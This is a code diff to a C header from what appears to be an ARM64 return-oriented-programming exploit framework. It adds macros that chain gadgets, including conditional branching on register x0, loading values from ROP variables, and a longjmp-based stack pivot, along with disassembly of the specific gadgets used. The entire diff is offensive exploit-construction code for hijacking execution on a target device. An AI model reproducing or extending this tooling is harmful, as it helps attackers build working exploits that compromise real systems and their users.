@@ -70,9 +70,9 @@ typedef struct rop_var rop_var_t;
 	ADD_GADGET(); \
 	curr_gadget->type = ROP_LOOP_END;
 
-#define ADD_LOOP_BREAK(name) \
+#define ADD_LOOP_BREAK_IF_X0_NONZERO(name) \
 	ADD_GADGET(); \
-	curr_gadget->value = strdup(name); \
+	curr_gadget->value = (uint64_t) strdup(name); \
 	curr_gadget->type = ROP_LOOP_BREAK;
 
 #define ADD_CODE_GADGET(addr) \
@@ -149,6 +149,22 @@ longjmp:
 	   180a81818	ADD     X0, X0, #1
 	   180a8181c    RET                          // pivoted
 
+str_x0_gadget:
+            0x198ba668c      601600f9       str x0, [x19, 0x28]
+            0x198ba6690      00008052       movz w0, 0
+            0x198ba6694      fd7b41a9       ldp x29, x30, [sp, 0x10]
+            0x198ba6698      f44fc2a8       ldp x20, x19, [sp], 0x20
+            0x198ba669c      c0035fd6   
+
+cbz_x0_gadget:
+			┌──<  0x00349c54      400000b4       cbz x0, 0x349c5c
+			┌───< 0x00349c58      397e1d14       b 0xaa953c
+			│└──> 0x00349c5c      c0035fd6       ret 
+    
+			└──>  0x00aa953c   *  b0a50bf0       adrp x16, 0x17f60000
+				  0x00aa9540      109a46f9       ldr x16, [x16, 0xd30]    ; [0xd30:4]=0
+				  0x00aa9544      00021fd6       br x16 
+
 */
 
 // we assume we get here with pc pointing to the top of longjump and x0 pointing to the new buffer (which we will create now)
@@ -188,7 +204,8 @@ longjmp:
 	ADD_GADGET(); /* D13 */\
 	ADD_GADGET(); /* D14 */\
 	ADD_GADGET(); /* D15 */\
-	ADD_BUFFER((offsets)->stage3_databuffer,((offsets)->stage3_databuffer_len-22*8)); // encount for this longjmp buffer here 
+	ADD_BUFFER((offsets)->stage3_databuffer,((offsets)->stage3_databuffer_len-22*8)); /* encount for this longjmp buffer here */ \
+	SETUP_IF_X0();
 	
 // assuming we get here with pc pointing to the loader part of our beast gadget
 #define CALL_FUNCTION(next_addr,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
@@ -375,6 +392,60 @@ longjmp:
 	ADD_ROP_VAR_GADGET(name); /* x25 */ \
 	ADD_STATIC_GADGET(8); /* x24 */ \
 	ADD_GADGET(); /* x23 */ \
+	ADD_GADGET(); /* x22 */ \
+	ADD_GADGET(); /* x21 */ \
+	ADD_GADGET(); /* x20 */ \
+	ADD_GADGET(); /* x19 */ \
+	ADD_GADGET(); /* x29 */ \
+	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
+
+#define SET_X0_FROM_ROP_VAR(name) \
+	ADD_GADGET(); \
+	ADD_GADGET(); \
+	ADD_GADGET(); /* d9 */ \
+	ADD_GADGET(); /* d8 */ \
+	ADD_GADGET(); /* x28 */ \
+	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
+	ADD_REL_OFFSET_GADGET((8*8+7*8+1*8)); /* x26 */ \
+	ADD_ROP_VAR_GADGET(name); /* x25 */ \
+	ADD_STATIC_GADGET(8); /* x24 */ \
+	ADD_GADGET(); /* x23 */ \
+	ADD_GADGET(); /* x22 */ \
+	ADD_GADGET(); /* x21 */ \
+	ADD_GADGET(); /* x20 */ \
+	ADD_GADGET(); /* x19 */ \
+	ADD_GADGET(); /* x29 */ \
+	ADD_CODE_GADGET((offsets)->BEAST_GADGET); /* x30 */ \
+	ADD_GADGET(); \
+	ADD_GADGET(); \
+	ADD_GADGET(); /* d9 */ \
+	ADD_GADGET(); /* d8 */ \
+	ADD_GADGET(); /* x28 */ \
+	ADD_CODE_GADGET((offsets)->rop_nop); /* x27 */ \
+	ADD_GADGET(); /* x26 */ \
+	ADD_GADGET(); /* x25 */ \
+	ADD_GADGET(); /* x24 */ \
+	ADD_GADGET(); /* x23 */ \
+	ADD_GADGET(); /* x22 */ \
+	ADD_GADGET(); /* x21 */ \
+	ADD_GADGET(); /* x20 */ \
+	ADD_GADGET(); /* x19 */ \
+	ADD_GADGET(); /* x29 */ \
+	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
+
+
+// we will (mis)use the str_x0_gadget as a regloader to load regs with other values/offset the stack by another value
+#define SETUP_IF_X0() \
+	ADD_GADGET(); \
+	ADD_GADGET(); \
+	ADD_GADGET(); /* d9 */ \
+	ADD_GADGET(); /* d8 */ \
+	ADD_GADGET(); /* x28 */ \
+	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
+	ADD_CODE_GADGET((offsets)->cbz_x0_x16_load); /* x26 */ \
+	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
+	ADD_STATIC_GADGET(8); /* x24 */ \
+	ADD_CODE_GADGET((offsets)->str_x0_gadget_offset); /* x23 */ \
 	ADD_GADGET(); /* x22 */ \
 	ADD_GADGET(); /* x21 */ \
 	ADD_GADGET(); /* x20 */ \
